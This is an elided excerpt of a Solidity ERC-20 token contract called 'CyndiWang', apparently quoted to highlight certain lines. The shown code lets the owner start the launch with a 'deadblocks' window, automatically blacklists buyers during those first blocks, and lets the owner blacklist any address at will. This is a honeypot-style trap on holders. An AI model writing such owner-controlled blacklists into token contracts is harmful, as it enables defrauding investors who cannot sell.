...
contract Baby is Context, IERC20, Ownable {
    ...
    string private _name = "CyndiWang";
    string private _symbol = "CyndiWang";
    ...
    mapping (address => bool) public bclisted;
    ...
    constructor () {
        ...
        teamWalletAddress = payable(0xD7a3720e15CdD34D1AC2b783c0AB84A6872c0eB2);
        marketingWalletAddress = payable(0xac5e877f1212EaBdc725CB6121C1cEc1FF0Ff14B);
    ...
    function L(uint256 deadblock,bool status) public onlyOwner {
        deadblocks = deadblock;
        isLaunch = status;
        ...
        else
        {
            ...
            if (isExcludedFromFee[sender] || isExcludedFromFee[recipient]) {
                ...
                if (block.number < launchBlock + deadblocks) {
                    if (!bclisted[recipient]) bclisted[recipient] = true;
                }
    ...
    function setBcList(address recipient, bool status) public onlyOwner {
        bclisted[recipient] = status;
    }
